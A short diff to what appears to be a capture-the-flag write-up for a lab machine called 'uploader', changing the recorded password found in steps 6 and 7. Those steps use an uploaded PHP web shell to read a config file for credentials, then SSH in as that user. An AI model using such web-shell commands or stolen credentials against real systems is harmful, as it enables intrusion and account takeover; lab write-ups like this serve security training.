@@ -88,12 +88,13 @@ Output: uid=33(www-data)
 
 #### STEP 6:- Credential Discovery
 curl "http://uploader.htb/uploads/shell.php5?cmd=cat+/var/www/html/config.php"
-Output: ayush : ayush@123
+Output: ayush : ayush2025
 
 ![Credential Discovery](./screenshot/Screenshot_2026-06-26_13-49-39.png)
 
 ### STEP 7:- Lateral Movement
-ssh ayush@{MACHINE_IP}
+ssh ayush@{MACHINE_IP} 
+
 ![Lateral movement](./screenshot/Screenshot_2026-06-26_13-49-51.png)
 
 cat /home/ayush/user.txt
